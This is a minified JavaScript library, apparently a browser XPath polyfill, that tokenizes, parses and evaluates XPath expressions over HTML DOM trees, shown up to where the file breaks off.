(function(){var h=this;
function aa(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==
b&&"undefined"==typeof a.call)return"object";return b}function k(a){return"string"==typeof a}function ba(a,b,c){return a.call.apply(a.bind,arguments)}function ca(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}}
function da(a,b,c){da=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?ba:ca;return da.apply(null,arguments)}function ea(a,b){var c=Array.prototype.slice.call(arguments,1);return function(){var b=c.slice();b.push.apply(b,arguments);return a.apply(this,b)}}
function m(a){var b=n;function c(){}c.prototype=b.prototype;a.u=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.t=function(a,c,f){return b.prototype[c].apply(a,Array.prototype.slice.call(arguments,2))}};var fa=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")};function ga(a,b){return a<b?-1:a>b?1:0};var q;a:{var ha=h.navigator;if(ha){var ia=ha.userAgent;if(ia){q=ia;break a}}q=""}function r(a){return-1!=q.indexOf(a)};var s=Array.prototype,ja=s.indexOf?function(a,b,c){return s.indexOf.call(a,b,c)}:function(a,b,c){c=null==c?0:0>c?Math.max(0,a.length+c):c;if(k(a))return k(b)&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},t=s.forEach?function(a,b,c){s.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=k(a)?a.split(""):a,f=0;f<d;f++)f in e&&b.call(c,e[f],f,a)},ka=s.filter?function(a,b,c){return s.filter.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=[],f=0,g=k(a)?
a.split(""):a,l=0;l<d;l++)if(l in g){var p=g[l];b.call(c,p,l,a)&&(e[f++]=p)}return e},u=s.reduce?function(a,b,c,d){d&&(b=da(b,d));return s.reduce.call(a,b,c)}:function(a,b,c,d){var e=c;t(a,function(c,g){e=b.call(d,e,c,g,a)});return e},la=s.some?function(a,b,c){return s.some.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=k(a)?a.split(""):a,f=0;f<d;f++)if(f in e&&b.call(c,e[f],f,a))return!0;return!1};
function ma(a,b){var c;a:{c=a.length;for(var d=k(a)?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){c=e;break a}c=-1}return 0>c?null:k(a)?a.charAt(c):a[c]}function na(a){return s.concat.apply(s,arguments)}function oa(a,b,c){return 2>=arguments.length?s.slice.call(a,b):s.slice.call(a,b,c)};var pa=r("Opera")||r("OPR"),v=r("Trident")||r("MSIE"),qa=r("Gecko")&&-1==q.toLowerCase().indexOf("webkit")&&!(r("Trident")||r("MSIE")),ra=-1!=q.toLowerCase().indexOf("webkit");function sa(){var a=h.document;return a?a.documentMode:void 0}
var ta=function(){var a="",b;if(pa&&h.opera)return a=h.opera.version,"function"==aa(a)?a():a;qa?b=/rv\:([^\);]+)(\)|;)/:v?b=/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/:ra&&(b=/WebKit\/(\S+)/);b&&(a=(a=b.exec(q))?a[1]:"");return v&&(b=sa(),b>parseFloat(a))?String(b):a}(),ua={};
function va(a){if(!ua[a]){for(var b=0,c=fa(String(ta)).split("."),d=fa(String(a)).split("."),e=Math.max(c.length,d.length),f=0;0==b&&f<e;f++){var g=c[f]||"",l=d[f]||"",p=RegExp("(\\d*)(\\D*)","g"),x=RegExp("(\\d*)(\\D*)","g");do{var C=p.exec(g)||["","",""],X=x.exec(l)||["","",""];if(0==C[0].length&&0==X[0].length)break;b=ga(0==C[1].length?0:parseInt(C[1],10),0==X[1].length?0:parseInt(X[1],10))||ga(0==C[2].length,0==X[2].length)||ga(C[2],X[2])}while(0==b)}ua[a]=0<=b}}
var wa=h.document,xa=wa&&v?sa()||("CSS1Compat"==wa.compatMode?parseInt(ta,10):5):void 0;!qa&&!v||v&&v&&9<=xa||qa&&va("1.9.1");v&&va("9");function ya(a,b){if(a.contains&&1==b.nodeType)return a==b||a.contains(b);if("undefined"!=typeof a.compareDocumentPosition)return a==b||Boolean(a.compareDocumentPosition(b)&16);for(;b&&a!=b;)b=b.parentNode;return b==a}
function za(a,b){if(a==b)return 0;if(a.compareDocumentPosition)return a.compareDocumentPosition(b)&2?1:-1;if(v&&!(v&&9<=xa)){if(9==a.nodeType)return-1;if(9==b.nodeType)return 1}if("sourceIndex"in a||a.parentNode&&"sourceIndex"in a.parentNode){var c=1==a.nodeType,d=1==b.nodeType;if(c&&d)return a.sourceIndex-b.sourceIndex;var e=a.parentNode,f=b.parentNode;return e==f?Aa(a,b):!c&&ya(e,b)?-1*Ba(a,b):!d&&ya(f,a)?Ba(b,a):(c?a.sourceIndex:e.sourceIndex)-(d?b.sourceIndex:f.sourceIndex)}d=9==a.nodeType?a:
a.ownerDocument||a.document;c=d.createRange();c.selectNode(a);c.collapse(!0);d=d.createRange();d.selectNode(b);d.collapse(!0);return c.compareBoundaryPoints(h.Range.START_TO_END,d)}function Ba(a,b){var c=a.parentNode;if(c==b)return-1;for(var d=b;d.parentNode!=c;)d=d.parentNode;return Aa(d,a)}function Aa(a,b){for(var c=b;c=c.previousSibling;)if(c==a)return-1;return 1};function w(a,b,c){this.a=a;this.b=b||1;this.d=c||1};function Ca(a){this.b=a;this.a=0}function Da(a){a=a.match(Ea);for(var b=0;b<a.length;b++)Fa.test(a[b])&&a.splice(b,1);return new Ca(a)}var Ea=RegExp("\\$?(?:(?![0-9-])[\\w-]+:)?(?![0-9-])[\\w-]+|\\/\\/|\\.\\.|::|\\d+(?:\\.\\d*)?|\\.\\d+|\"[^\"]*\"|'[^']*'|[!<>]=|\\s+|.","g"),Fa=/^\s/;function y(a,b){return a.b[a.a+(b||0)]}function z(a){return a.b[a.a++]}function Ga(a){return a.b.length<=a.a};function A(a,b){this.h=a.toLowerCase();this.c=b?b.toLowerCase():"http://www.w3.org/1999/xhtml"}A.prototype.a=function(a){var b=a.nodeType;return 1!=b&&2!=b?!1:"*"!=this.h&&this.h!=a.nodeName.toLowerCase()?!1:this.c==(a.namespaceURI?a.namespaceURI.toLowerCase():"http://www.w3.org/1999/xhtml")};A.prototype.d=function(){return this.h};A.prototype.toString=function(){return"Name Test: "+("http://www.w3.org/1999/xhtml"==this.c?"":this.c+":")+this.h};function B(a,b){this.f=a;this.c=void 0!==b?b:null;this.b=null;switch(a){case "comment":this.b=8;break;case "text":this.b=3;break;case "processing-instruction":this.b=7;break;case "node":break;default:throw Error("Unexpected argument");}}function Ha(a){return"comment"==a||"text"==a||"processing-instruction"==a||"node"==a}B.prototype.a=function(a){return null===this.b||this.b==a.nodeType};B.prototype.d=function(){return this.f};
B.prototype.toString=function(){var a="Kind Test: "+this.f;null===this.c||(a+=D(this.c));return a};function Ia(a){switch(a.nodeType){case 1:return ea(Ja,a);case 9:return Ia(a.documentElement);case 11:case 10:case 6:case 12:return Ka;default:return a.parentNode?Ia(a.parentNode):Ka}}function Ka(){return null}function Ja(a,b){if(a.prefix==b)return a.namespaceURI||"http://www.w3.org/1999/xhtml";var c=a.getAttributeNode("xmlns:"+b);return c&&c.specified?c.value||null:a.parentNode&&9!=a.parentNode.nodeType?Ja(a.parentNode,b):null};var E=v&&!(v&&9<=xa),La=v&&!(v&&8<=xa);function F(a,b,c,d){this.a=a;this.nodeName=c;this.nodeValue=d;this.nodeType=2;this.parentNode=this.ownerElement=b}function Ma(a,b){var c=La&&"href"==b.nodeName?a.getAttribute(b.nodeName,2):b.nodeValue;return new F(b,a,b.nodeName,c)};function G(a){var b=null,c=a.nodeType;1==c&&(b=a.textContent,b=void 0==b||null==b?a.innerText:b,b=void 0==b||null==b?"":b);if("string"!=typeof b)if(E&&"title"==a.nodeName.toLowerCase()&&1==c)b=a.text;else if(9==c||1==c){a=9==c?a.documentElement:a.firstChild;for(var c=0,d=[],b="";a;){do 1!=a.nodeType&&(b+=a.nodeValue),E&&"title"==a.nodeName.toLowerCase()&&(b+=a.text),d[c++]=a;while(a=a.firstChild);for(;c&&!(a=d[--c].nextSibling););}}else b=a.nodeValue;return""+b}
function H(a,b,c){if(null===b)return!0;try{if(!a.getAttribute)return!1}catch(d){return!1}La&&"class"==b&&(b="className");return null==c?!!a.getAttribute(b):a.getAttribute(b,2)==c}function I(a,b,c,d,e){return(E?Na:Oa).call(null,a,b,k(c)?c:null,k(d)?d:null,e||new J)}
function Na(a,b,c,d,e){if(a instanceof A||8==a.b||c&&null===a.b){var f=b.all;if(!f)return e;a=Pa(a);if("*"!=a&&(f=b.getElementsByTagName(a),!f))return e;if(c){for(var g=[],l=0;b=f[l++];)H(b,c,d)&&g.push(b);f=g}for(l=0;b=f[l++];)"*"==a&&"!"==b.tagName||K(e,b);return e}Qa(a,b,c,d,e);return e}
function Oa(a,b,c,d,e){b.getElementsByName&&d&&"name"==c&&!v?(b=b.getElementsByName(d),t(b,function(b){a.a(b)&&K(e,b)})):b.getElementsByClassName&&d&&"class"==c?(b=b.getElementsByClassName(d),t(b,function(b){b.className==d&&a.a(b)&&K(e,b)})):a instanceof B?Qa(a,b,c,d,e):b.getElementsByTagName&&(b=b.getElementsByTagName(a.d()),t(b,function(a){H(a,c,d)&&K(e,a)}));return e}
function Ra(a,b,c,d,e){var f;if((a instanceof A||8==a.b||c&&null===a.b)&&(f=b.childNodes)){var g=Pa(a);if("*"!=g&&(f=ka(f,function(a){return a.tagName&&a.tagName.toLowerCase()==g}),!f))return e;c&&(f=ka(f,function(a){return H(a,c,d)}));t(f,function(a){"*"==g&&("!"==a.tagName||"*"==g&&1!=a.nodeType)||K(e,a)});return e}return Sa(a,b,c,d,e)}function Sa(a,b,c,d,e){for(b=b.firstChild;b;b=b.nextSibling)H(b,c,d)&&a.a(b)&&K(e,b);return e}
function Qa(a,b,c,d,e){for(b=b.firstChild;b;b=b.nextSibling)H(b,c,d)&&a.a(b)&&K(e,b),Qa(a,b,c,d,e)}function Pa(a){if(a instanceof B){if(8==a.b)return"!";if(null===a.b)return"*"}return a.d()};function J(){this.b=this.a=null;this.i=0}function Ta(a){this.d=a;this.a=this.b=null}function Ua(a,b){if(!a.a)return b;if(!b.a)return a;for(var c=a.a,d=b.a,e=null,f=null,g=0;c&&d;){var f=c.d,l=d.d;f==l||f instanceof F&&l instanceof F&&f.a==l.a?(f=c,c=c.a,d=d.a):0<za(c.d,d.d)?(f=d,d=d.a):(f=c,c=c.a);(f.b=e)?e.a=f:a.a=f;e=f;g++}for(f=c||d;f;)f.b=e,e=e.a=f,g++,f=f.a;a.b=e;a.i=g;return a}function Va(a,b){var c=new Ta(b);c.a=a.a;a.b?a.a.b=c:a.a=a.b=c;a.a=c;a.i++}
function K(a,b){var c=new Ta(b);c.b=a.b;a.a?a.b.a=c:a.a=a.b=c;a.b=c;a.i++}function Wa(a){return(a=a.a)?a.d:null}function Xa(a){return(a=Wa(a))?G(a):""}function L(a,b){return new Ya(a,!!b)}function Ya(a,b){this.d=a;this.b=(this.c=b)?a.b:a.a;this.a=null}function M(a){var b=a.b;if(null==b)return null;var c=a.a=b;a.b=a.c?b.b:b.a;return c.d};function n(a){this.g=a;this.b=this.e=!1;this.d=null}function D(a){return"\n  "+a.toString().split("\n").join("\n  ")}function Za(a,b){a.e=b}function $a(a,b){a.b=b}function N(a,b){var c=a.a(b);return c instanceof J?+Xa(c):+c}function O(a,b){var c=a.a(b);return c instanceof J?Xa(c):""+c}function P(a,b){var c=a.a(b);return c instanceof J?!!c.i:!!c};function Q(a,b,c){n.call(this,a.g);this.c=a;this.f=b;this.k=c;this.e=b.e||c.e;this.b=b.b||c.b;this.c==ab&&(c.b||c.e||4==c.g||0==c.g||!b.d?b.b||b.e||4==b.g||0==b.g||!c.d||(this.d={name:c.d.name,l:b}):this.d={name:b.d.name,l:c})}m(Q);
function R(a,b,c,d,e){b=b.a(d);c=c.a(d);var f;if(b instanceof J&&c instanceof J){e=L(b);for(d=M(e);d;d=M(e))for(b=L(c),f=M(b);f;f=M(b))if(a(G(d),G(f)))return!0;return!1}if(b instanceof J||c instanceof J){b instanceof J?e=b:(e=c,c=b);e=L(e);b=typeof c;for(d=M(e);d;d=M(e)){switch(b){case "number":d=+G(d);break;case "boolean":d=!!G(d);break;case "string":d=G(d);break;default:throw Error("Illegal primitive type for comparison.");}if(a(d,c))return!0}return!1}return e?"boolean"==typeof b||"boolean"==typeof c?
a(!!b,!!c):"number"==typeof b||"number"==typeof c?a(+b,+c):a(b,c):a(+b,+c)}Q.prototype.a=function(a){return this.c.j(this.f,this.k,a)};Q.prototype.toString=function(){var a="Binary Expression: "+this.c,a=a+D(this.f);return a+=D(this.k)};function bb(a,b,c,d){this.a=a;this.p=b;this.g=c;this.j=d}bb.prototype.toString=function(){return this.a};var cb={};function S(a,b,c,d){if(cb.hasOwnProperty(a))throw Error("Binary operator already created: "+a);a=new bb(a,b,c,d);return cb[a.toString()]=a}
S("div",6,1,function(a,b,c){return N(a,c)/N(b,c)});S("mod",6,1,function(a,b,c){return N(a,c)%N(b,c)});S("*",6,1,function(a,b,c){return N(a,c)*N(b,c)});S("+",5,1,function(a,b,c){return N(a,c)+N(b,c)});S("-",5,1,function(a,b,c){return N(a,c)-N(b,c)});S("<",4,2,function(a,b,c){return R(function(a,b){return a<b},a,b,c)});S(">",4,2,function(a,b,c){return R(function(a,b){return a>b},a,b,c)});S("<=",4,2,function(a,b,c){return R(function(a,b){return a<=b},a,b,c)});
S(">=",4,2,function(a,b,c){return R(function(a,b){return a>=b},a,b,c)});var ab=S("=",3,2,function(a,b,c){return R(function(a,b){return a==b},a,b,c,!0)});S("!=",3,2,function(a,b,c){return R(function(a,b){return a!=b},a,b,c,!0)});S("and",2,2,function(a,b,c){return P(a,c)&&P(b,c)});S("or",1,2,function(a,b,c){return P(a,c)||P(b,c)});function db(a,b){if(b.a.length&&4!=a.g)throw Error("Primary expression must evaluate to nodeset if filter has predicate(s).");n.call(this,a.g);this.c=a;this.f=b;this.e=a.e;this.b=a.b}m(db);db.prototype.a=function(a){a=this.c.a(a);return eb(this.f,a)};db.prototype.toString=function(){var a;a="Filter:"+D(this.c);return a+=D(this.f)};function fb(a,b){if(b.length<a.o)throw Error("Function "+a.h+" expects at least"+a.o+" arguments, "+b.length+" given");if(null!==a.n&&b.length>a.n)throw Error("Function "+a.h+" expects at most "+a.n+" arguments, "+b.length+" given");a.s&&t(b,function(b,d){if(4!=b.g)throw Error("Argument "+d+" to function "+a.h+" is not of type Nodeset: "+b);});n.call(this,a.g);this.f=a;this.c=b;Za(this,a.e||la(b,function(a){return a.e}));$a(this,a.r&&!b.length||a.q&&!!b.length||la(b,function(a){return a.b}))}m(fb);
fb.prototype.a=function(a){return this.f.j.apply(null,na(a,this.c))};fb.prototype.toString=function(){var a="Function: "+this.f;if(this.c.length)var b=u(this.c,function(a,b){return a+D(b)},"Arguments:"),a=a+D(b);return a};function gb(a,b,c,d,e,f,g,l,p){this.h=a;this.g=b;this.e=c;this.r=d;this.q=e;this.j=f;this.o=g;this.n=void 0!==l?l:g;this.s=!!p}gb.prototype.toString=function(){return this.h};var hb={};
function T(a,b,c,d,e,f,g,l){if(hb.hasOwnProperty(a))throw Error("Function already created: "+a+".");hb[a]=new gb(a,b,c,d,!1,e,f,g,l)}T("boolean",2,!1,!1,function(a,b){return P(b,a)},1);T("ceiling",1,!1,!1,function(a,b){return Math.ceil(N(b,a))},1);T("concat",3,!1,!1,function(a,b){return u(oa(arguments,1),function(b,d){return b+O(d,a)},"")},2,null);T("contains",2,!1,!1,function(a,b,c){b=O(b,a);a=O(c,a);return-1!=b.indexOf(a)},2);T("count",1,!1,!1,function(a,b){return b.a(a).i},1,1,!0);
T("false",2,!1,!1,function(){return!1},0);T("floor",1,!1,!1,function(a,b){return Math.floor(N(b,a))},1);T("id",4,!1,!1,function(a,b){function c(a){if(E){var b=e.all[a];if(b){if(b.nodeType&&a==b.id)return b;if(b.length)return ma(b,function(b){return a==b.id})}return null}return e.getElementById(a)}var d=a.a,e=9==d.nodeType?d:d.ownerDocument,d=O(b,a).split(/\s+/),f=[];t(d,function(a){a=c(a);!a||0<=ja(f,a)||f.push(a)});f.sort(za);var g=new J;t(f,function(a){K(g,a)});return g},1);
T("lang",2,!1,!1,function(){return!1},1);T("last",1,!0,!1,function(a){if(1!=arguments.length)throw Error("Function last expects ()");return a.d},0);T("local-name",3,!1,!0,function(a,b){var c=b?Wa(b.a(a)):a.a;return c?c.localName||c.nodeName.toLowerCase():""},0,1,!0);T("name",3,!1,!0,function(a,b){var c=b?Wa(b.a(a)):a.a;return c?c.nodeName.toLowerCase():""},0,1,!0);T("namespace-uri",3,!0,!1,function(){return""},0,1,!0);
T("normalize-space",3,!1,!0,function(a,b){return(b?O(b,a):G(a.a)).replace(/[\s\xa0]+/g," ").replace(/^\s+|\s+$/g,"")},0,1);T("not",2,!1,!1,function(a,b){return!P(b,a)},1);T("number",1,!1,!0,function(a,b){return b?N(b,a):+G(a.a)},0,1);T("position",1,!0,!1,function(a){return a.b},0);T("round",1,!1,!1,function(a,b){return Math.round(N(b,a))},1);T("starts-with",2,!1,!1,function(a,b,c){b=O(b,a);a=O(c,a);return 0==b.lastIndexOf(a,0)},2);T("string",3,!1,!0,function(a,b){return b?O(b,a):G(a.a)},0,1);
T("string-length",1,!1,!0,function(a,b){return(b?O(b,a):G(a.a)).length},0,1);T("substring",3,!1,!1,function(a,b,c,d){c=N(c,a);if(isNaN(c)||Infinity==c||-Infinity==c)return"";d=d?N(d,a):Infinity;if(isNaN(d)||-Infinity===d)return"";c=Math.round(c)-1;var e=Math.max(c,0);a=O(b,a);if(Infinity==d)return a.substring(e);b=Math.round(d);return a.substring(e,c+b)},2,3);T("substring-after",3,!1,!1,function(a,b,c){b=O(b,a);a=O(c,a);c=b.indexOf(a);return-1==c?"":b.substring(c+a.length)},2);
T("substring-before",3,!1,!1,function(a,b,c){b=O(b,a);a=O(c,a);a=b.indexOf(a);return-1==a?"":b.substring(0,a)},2);T("sum",1,!1,!1,function(a,b){for(var c=L(b.a(a)),d=0,e=M(c);e;e=M(c))d+=+G(e);return d},1,1,!0);T("translate",3,!1,!1,function(a,b,c,d){b=O(b,a);c=O(c,a);var e=O(d,a);a=[];for(d=0;d<c.length;d++){var f=c.charAt(d);f in a||(a[f]=e.charAt(d))}c="";for(d=0;d<b.length;d++)f=b.charAt(d),c+=f in a?a[f]:f;return c},3);T("true",2,!1,!1,function(){return!0},0);function ib(a){n.call(this,3);this.c=a.substring(1,a.length-1)}m(ib);ib.prototype.a=function(){return this.c};ib.prototype.toString=function(){return"Literal: "+this.c};function jb(a){n.call(this,1);this.c=a}m(jb);jb.prototype.a=function(){return this.c};jb.prototype.toString=function(){return"Number: "+this.c};function kb(a,b){n.call(this,a.g);this.f=a;this.c=b;this.e=a.e;this.b=a.b;if(1==this.c.length){var c=this.c[0];c.m||c.c!=lb||(c=c.k,"*"!=c.d()&&(this.d={name:c.d(),l:null}))}}m(kb);function U(){n.call(this,4)}m(U);U.prototype.a=function(a){var b=new J;a=a.a;9==a.nodeType?K(b,a):K(b,a.ownerDocument);return b};U.prototype.toString=function(){return"Root Helper Expression"};function mb(){n.call(this,4)}m(mb);mb.prototype.a=function(a){var b=new J;K(b,a.a);return b};mb.prototype.toString=function(){return"Context Helper Expression"};
function nb(a){return"/"==a||"//"==a}kb.prototype.a=function(a){var b=this.f.a(a);if(!(b instanceof J))throw Error("Filter expression must evaluate to nodeset.");a=this.c;for(var c=0,d=a.length;c<d&&b.i;c++){var e=a[c],f=L(b,e.c.a),g;if(e.e||e.c!=ob)if(e.e||e.c!=pb)for(g=M(f),b=e.a(new w(g));null!=(g=M(f));)g=e.a(new w(g)),b=Ua(b,g);else g=M(f),b=e.a(new w(g));else{for(g=M(f);(b=M(f))&&(!g.contains||g.contains(b))&&b.compareDocumentPosition(g)&8;g=b);b=e.a(new w(g))}}return b};
kb.prototype.toString=function(){var a;a="Path Expression:"+D(this.f);if(this.c.length){var b=u(this.c,function(a,b){return a+D(b)},"Steps:");a+=D(b)}return a};function qb(a,b){this.a=a;this.b=!!b}
function eb(a,b,c){for(c=c||0;c<a.a.length;c++)for(var d=a.a[c],e=L(b),f=b.i,g,l=0;g=M(e);l++){var p=a.b?f-l:l+1;g=d.a(new w(g,p,f));if("number"==typeof g)p=p==g;else if("string"==typeof g||"boolean"==typeof g)p=!!g;else if(g instanceof J)p=0<g.i;else throw Error("Predicate.evaluate returned an unexpected type.");if(!p){p=e;g=p.d;var x=p.a;if(!x)throw Error("Next must be called at least once before remove.");var C=x.b,x=x.a;C?C.a=x:g.a=x;x?x.b=C:g.b=C;g.i--;p.a=null}}return b}
qb.prototype.toString=function(){return u(this.a,function(a,b){return a+D(b)},"Predicates:")};function V(a,b,c,d){n.call(this,4);this.c=a;this.k=b;this.f=c||new qb([]);this.m=!!d;b=this.f;b=0<b.a.length?b.a[0].d:null;a.b&&b&&(a=b.name,a=E?a.toLowerCase():a,this.d={name:a,l:b.l});a:{a=this.f;for(b=0;b<a.a.length;b++)if(c=a.a[b],c.e||1==c.g||0==c.g){a=!0;break a}a=!1}this.e=a}m(V);
V.prototype.a=function(a){var b=a.a,c=null,c=this.d,d=null,e=null,f=0;c&&(d=c.name,e=c.l?O(c.l,a):null,f=1);if(this.m)if(this.e||this.c!=rb)if(a=L((new V(sb,new B("node"))).a(a)),b=M(a))for(c=this.j(b,d,e,f);null!=(b=M(a));)c=Ua(c,this.j(b,d,e,f));else c=new J;else c=I(this.k,b,d,e),c=eb(this.f,c,f);else c=this.j(a.a,d,e,f);return c};V.prototype.j=function(a,b,c,d){a=this.c.d(this.k,a,b,c);return a=eb(this.f,a,d)};
V.prototype.toString=function(){var a;a="Step:"+D("Operator: "+(this.m?"//":"/"));this.c.h&&(a+=D("Axis: "+this.c));a+=D(this.k);if(this.f.a.length){var b=u(this.f.a,function(a,b){return a+D(b)},"Predicates:");a+=D(b)}return a};function tb(a,b,c,d){this.h=a;this.d=b;this.a=c;this.b=d}tb.prototype.toString=function(){return this.h};var ub={};function W(a,b,c,d){if(ub.hasOwnProperty(a))throw Error("Axis already created: "+a);b=new tb(a,b,c,!!d);return ub[a]=b}
W("ancestor",function(a,b){for(var c=new J,d=b;d=d.parentNode;)a.a(d)&&Va(c,d);return c},!0);W("ancestor-or-self",function(a,b){var c=new J,d=b;do a.a(d)&&Va(c,d);while(d=d.parentNode);return c},!0);
var lb=W("attribute",function(a,b){var c=new J,d=a.d();if("style"==d&&b.style&&E)return K(c,new F(b.style,b,"style",b.style.cssText)),c;var e=b.attributes;if(e)if(a instanceof B&&null===a.b||"*"==d)for(var d=0,f;f=e[d];d++)E?f.nodeValue&&K(c,Ma(b,f)):K(c,f);else(f=e.getNamedItem(d))&&(E?f.nodeValue&&K(c,Ma(b,f)):K(c,f));return c},!1),rb=W("child",function(a,b,c,d,e){return(E?Ra:Sa).call(null,a,b,k(c)?c:null,k(d)?d:null,e||new J)},!1,!0);W("descendant",I,!1,!0);
var sb=W("descendant-or-self",function(a,b,c,d){var e=new J;H(b,c,d)&&a.a(b)&&K(e,b);return I(a,b,c,d,e)},!1,!0),ob=W("following",function(a,b,c,d){var e=new J;do for(var f=b;f=f.nextSibling;)H(f,c,d)&&a.a(f)&&K(e,f),e=I(a,f,c,d,e);while(b=b.parentNode);return e},!1,!0);W("following-sibling",function(a,b){for(var c=new J,d=b;d=d.nextSibling;)a.a(d)&&K(c,d);return c},!1);W("namespace",function(){return new J},!1);
var vb=W("parent",function(a,b){var c=new J;if(9==b.nodeType)return c;if(2==b.nodeType)return K(c,b.ownerElement),c;var d=b.parentNode;a.a(d)&&K(c,d);return c},!1),pb=W("preceding",function(a,b,c,d){var e=new J,f=[];do f.unshift(b);while(b=b.parentNode);for(var g=1,l=f.length;g<l;g++){var p=[];for(b=f[g];b=b.previousSibling;)p.unshift(b);for(var x=0,C=p.length;x<C;x++)b=p[x],H(b,c,d)&&a.a(b)&&K(e,b),e=I(a,b,c,d,e)}return e},!0,!0);
W("preceding-sibling",function(a,b){for(var c=new J,d=b;d=d.previousSibling;)a.a(d)&&Va(c,d);return c},!0);var wb=W("self",function(a,b){var c=new J;a.a(b)&&K(c,b);return c},!1);function xb(a){n.call(this,1);this.c=a;this.e=a.e;this.b=a.b}m(xb);xb.prototype.a=function(a){return-N(this.c,a)};xb.prototype.toString=function(){return"Unary Expression: -"+D(this.c)};function yb(a){n.call(this,4);this.c=a;Za(this,la(this.c,function(a){return a.e}));$a(this,la(this.c,function(a){return a.b}))}m(yb);yb.prototype.a=function(a){var b=new J;t(this.c,function(c){c=c.a(a);if(!(c instanceof J))throw Error("Path expression must evaluate to NodeSet.");b=Ua(b,c)});return b};yb.prototype.toString=function(){return u(this.c,function(a,b){return a+D(b)},"Union Expression:")};function zb(a,b){this.a=a;this.b=b}function Ab(a){for(var b,c=[];;){Y(a,"Missing right hand side of binary expression.");b=Bb(a);var d=z(a.a);if(!d)break;var e=(d=cb[d]||null)&&d.p;if(!e){a.a.a--;break}for(;c.length&&e<=c[c.length-1].p;)b=new Q(c.pop(),c.pop(),b);c.push(b,d)}for(;c.length;)b=new Q(c.pop(),c.pop(),b);return b}function Y(a,b){if(Ga(a.a))throw Error(b);}function Cb(a,b){var c=z(a.a);if(c!=b)throw Error("Bad token, expected: "+b+" got: "+c);}
function Db(a){a=z(a.a);if(")"!=a)throw Error("Bad token: "+a);}function Eb(a){a=z(a.a);if(2>a.length)throw Error("Unclosed literal string");return new ib(a)}function Fb(a){var b=z(a.a),c=b.indexOf(":");if(-1==c)return new A(b);var d=b.substring(0,c);a=a.b(d);if(!a)throw Error("Namespace prefix not declared: "+d);b=b.substr(c+1);return new A(b,a)}
function Gb(a){var b,c=[],d;if(nb(y(a.a))){b=z(a.a);d=y(a.a);if("/"==b&&(Ga(a.a)||"."!=d&&".."!=d&&"@"!=d&&"*"!=d&&!/(?![0-9])[\w]/.test(d)))return new U;d=new U;Y(a,"Missing next location step.");b=Hb(a,b);c.push(b)}else{a:{b=y(a.a);d=b.charAt(0);switch(d){case "$":throw Error("Variable reference not allowed in HTML XPath");case "(":z(a.a);b=Ab(a);Y(a,'unclosed "("');Cb(a,")");break;case '"':case "'":b=Eb(a);break;default:if(isNaN(+b))if(!Ha(b)&&/(?![0-9])[\w]/.test(d)&&"("==y(a.a,1)){b=z(a.a);b=
hb[b]||null;z(a.a);for(d=[];")"!=y(a.a);){Y(a,"Missing function argument list.");d.push(Ab(a));if(","!=y(a.a))break;z(a.a)}Y(a,"Unclosed function argument list.");Db(a);b=new fb(b,d)}else{b=null;break a}else b=new jb(+z(a.a))}"["==y(a.a)&&(d=new qb(Ib(a)),b=new db(b,d))}if(b)if(nb(y(a.a)))d=b;else return b;else b=Hb(a,"/"),d=new mb,c.push(b)}for(;nb(y(a.a));)b=z(a.a),Y(a,"Missing next location step."),b=Hb(a,b),c.push(b);return new kb(d,c)}
function Hb(a,b){var c,d,e;if("/"!=b&&"//"!=b)throw Error('Step op should be "/" or "//"');if("."==y(a.a))return d=new V(wb,new B("node")),z(a.a),d;if(".."==y(a.a))return d=new V(vb,new B("node")),z(a.a),d;var f;if("@"==y(a.a))f=lb,z(a.a),Y(a,"Missing attribute name");else if("::"==y(a.a,1)){if(!/(?![0-9])[\w]/.test(y(a.a).charAt(0)))throw Error("Bad token: "+z(a.a));c=z(a.a);f=ub[c]||null;if(!f)throw Error("No axis with name: "+c);z(a.a);Y(a,"Missing node name")}else f=rb;c=y(a.a);if(/(?![0-9])[\w]/.test(c.charAt(0)))if("("==
y(a.a,1)){if(!Ha(c))throw Error("Invalid node type: "+c);c=z(a.a);if(!Ha(c))throw Error("Invalid type name: "+c);Cb(a,"(");Y(a,"Bad nodetype");e=y(a.a).charAt(0);var g=null;if('"'==e||"'"==e)g=Eb(a);Y(a,"Bad nodetype");Db(a);c=new B(c,g)}else c=Fb(a);else if("*"==c)c=Fb(a);else throw Error("Bad token: "+z(a.a));e=new qb(Ib(a),f.a);return d||new V(f,c,e,"//"==b)}
function Ib(a){for(var b=[];"["==y(a.a);){z(a.a);Y(a,"Missing predicate expression.");var c=Ab(a);b.push(c);Y(a,"Unclosed predicate expression.");Cb(a,"]")}return b}function Bb(a){if("-"==y(a.a))return z(a.a),new xb(Bb(a));var b=Gb(a);if("|"!=y(a.a))a=b;else{for(b=[b];"|"==z(a.a);)Y(a,"Missing next union location path."),b.push(Gb(a));a.a.a--;a=new yb(b)}return a};function Jb(a,b){if(!a.length)throw Error("Empty XPath expression.");var c=Da(a);if(Ga(c))throw Error("Invalid XPath expression.");b?"function"==aa(b)||(b=da(b.lookupNamespaceURI,b)):b=function(){return null};var d=Ab(new zb(c,b));if(!Ga(c))throw Error("Bad token: "+z(c));this.evaluate=function(a,b){var c=d.a(new w(a));return new Z(c,b)}}
